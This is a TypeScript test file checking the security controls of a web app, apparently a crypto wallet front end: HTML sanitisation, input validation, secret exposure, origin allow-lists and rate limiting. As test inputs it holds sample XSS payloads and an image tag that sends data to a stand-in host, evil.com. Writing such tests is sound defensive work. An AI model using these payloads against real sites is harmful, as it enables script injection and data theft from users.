import { describe, it, expect, beforeEach, vi } from 'vitest';
import DOMPurify from 'dompurify';

describe('Security: Input Validation & Sanitization', () => {
  describe('DOMPurify Integration', () => {
    it('should sanitize XSS payloads', () => {
      const malicious = '<img src=x onerror="alert(\'XSS\')" />';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    it('should allow safe HTML', () => {
      const safe = '<p>Safe content</p>';
      const sanitized = DOMPurify.sanitize(safe);
      expect(sanitized).toContain('<p>');
      expect(sanitized).toContain('Safe content');
    });

    it('should remove script tags', () => {
      const malicious = '<script>alert("XSS")</script>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('<script>');
    });

    it('should remove event handlers', () => {
      const malicious = '<div onclick="hack()">Click me</div>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onclick');
    });

    it('should prevent data exfiltration', () => {
      const malicious = '<img src="http://evil.com/steal?data=" />';
      const sanitized = DOMPurify.sanitize(malicious);
      // Should either remove the tag or neutralize the src
      expect(sanitized).not.toContain('evil.com');
    });
  });

  describe('Input Validation', () => {
    it('should validate email addresses', () => {
      const validEmails = [
        'user@example.com',
        'test.user+tag@example.co.uk',
      ];

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      validEmails.forEach(email => {
        expect(emailRegex.test(email)).toBe(true);
      });
    });

    it('should reject invalid email addresses', () => {
      const invalidEmails = [
        'not-an-email',
        '@example.com',
        'user@',
        'user name@example.com',
      ];

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      invalidEmails.forEach(email => {
        expect(emailRegex.test(email)).toBe(false);
      });
    });

    it('should validate numeric inputs', () => {
      const validateAmount = (val: any) => {
        const num = parseFloat(val);
        return !isNaN(num) && num > 0 && num <= 1000000;
      };

      expect(validateAmount('100')).toBe(true);
      expect(validateAmount('0')).toBe(false);
      expect(validateAmount('-100')).toBe(false);
      expect(validateAmount('not-a-number')).toBe(false);
      expect(validateAmount('1000000.01')).toBe(false);
    });

    it('should validate ethereum addresses', () => {
      const validateAddress = (addr: any) => {
        return /^0x[a-fA-F0-9]{40}$/.test(addr);
      };

      expect(validateAddress('0x' + '0'.repeat(40))).toBe(true);
      expect(validateAddress('0x' + 'a'.repeat(40))).toBe(true);
      expect(validateAddress('0x' + '0'.repeat(39))).toBe(false);
      expect(validateAddress('not-an-address')).toBe(false);
    });
  });
});

describe('Security: Secret Management', () => {
  it('should not expose secrets in environment variables', () => {
    // Check that sensitive env vars are NOT accessible
    const sensitiveKeys = ['API_KEY', 'PRIVATE_KEY', 'SECRET', 'PASSWORD'];
    
    sensitiveKeys.forEach(key => {
      expect(process.env[key]).toBeUndefined();
    });
  });

  it('should only expose public/safe env vars', () => {
    // Only VITE_* public variables should be available
    const publicKey = 'VITE_DEMO_MODE';
    expect(typeof process.env[publicKey]).toBe('string');
  });

  it('should never log secrets', () => {
    const consoleSpy = vi.spyOn(console, 'log');
    
    // Simulate logging (this would fail if secrets were logged)
    const userData = {
      username: 'user@example.com',
      balance: 100,
    };

    console.log('User data:', userData);
    expect(consoleSpy).toHaveBeenCalled();
    expect(consoleSpy.mock.calls[0][0]).not.toContain('SECRET');
    
    consoleSpy.mockRestore();
  });
});

describe('Security: HTTPS Enforcement', () => {
  it('should enforce secure context', () => {
    // In production, only HTTPS is allowed
    const isSecure = window.location.protocol === 'https:' || 
                     window.location.hostname === 'localhost' ||
                     window.location.hostname === '127.0.0.1';
    
    expect(isSecure).toBe(true);
  });
});

describe('Security: CORS Validation', () => {
  it('should validate API endpoints', () => {
    const validateOrigin = (url: string) => {
      const origin = new URL(url).origin;
      const allowedOrigins = [
        'https://supabase.example.com',
        'https://api.polygon.example.com',
      ];
      return allowedOrigins.includes(origin) || url.includes('localhost');
    };

    expect(validateOrigin('https://supabase.example.com/api/v1/users')).toBe(true);
    expect(validateOrigin('http://evil.com/api')).toBe(false);
  });

  it('should reject requests from non-whitelisted origins', () => {
    const blockedOrigins = ['http://evil.com', 'https://phishing.site'];
    
    blockedOrigins.forEach(origin => {
      const validateOrigin = (url: string) => {
        return !url.includes(origin);
      };
      expect(validateOrigin('http://evil.com/api')).toBe(false);
    });
  });
});

describe('Security: Rate Limiting (Frontend)', () => {
  it('should limit consecutive requests', async () => {
    const createRateLimiter = (maxRequests: number, windowMs: number) => {
      let requests: number[] = [];
      
      return (requestFn: () => Promise<any>) => {
        return async () => {
          const now = Date.now();
          requests = requests.filter(time => now - time < windowMs);
          
          if (requests.length >= maxRequests) {
            throw new Error('Rate limit exceeded');
          }
          
          requests.push(now);
          return requestFn();
        };
      };
    };

    const limiter = createRateLimiter(3, 1000); // 3 requests per second
    const mockRequest = async () => ({ status: 200 });
    
    const limitedRequest = limiter(mockRequest);
    
    // First 3 should succeed
    for (let i = 0; i < 3; i++) {
      await expect(limitedRequest()).resolves.toBeDefined();
    }
    
    // 4th should fail
    await expect(limitedRequest()).rejects.toThrow('Rate limit exceeded');
  });
});
